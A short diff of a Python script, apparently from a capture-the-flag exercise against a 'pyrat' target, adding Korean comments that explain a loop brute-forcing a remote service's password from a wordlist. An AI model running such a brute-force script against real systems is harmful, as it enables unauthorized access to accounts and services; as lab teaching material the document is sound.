@@ -55,15 +55,20 @@ def send_socket(ip, port, password):
 
 def brut_pass():
     # 패스워드 리스트 파일을 한 줄씩 읽어서 시도
+    # with open(...) as file: 구문은 파일을 열고, 작업이 끝나면 자동으로 닫아줌
+    # open(파일경로, 모드, 인코딩, 에러처리) 형식
+    # "r"은 읽기 모드, encoding="latin-1"은 특수문자 깨짐 방지, errors="ignore"는 에러 무시
     with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
+        # 파일을 한 줄씩 읽어서 반복
         for line in file:
-            password = line.strip()  # 줄 끝 개행 제거
+            password = line.strip()  # 줄 끝 개행 문자(\n) 제거
+            # send_socket 함수로 비밀번호 시도, 성공하면 반복 중단
             if send_socket(pyrat_IP, pyrat_PORT, password):
-                break  # 비번 찾으면 반복 중단
-            time.sleep(0.1)  # 서버 과부하 방지용 짧은 대기
+                break  # 비번 찾으면 바로 종료
+            time.sleep(0.1)  # 서버에 과부하 안 주려고 0.1초 대기
 
 if __name__ == "__main__":
-    # 스크립트 직접 실행 시
+    # 이 파일을 직접 실행할 때만 brut_pass() 실행
     brut_pass()
 ```
 
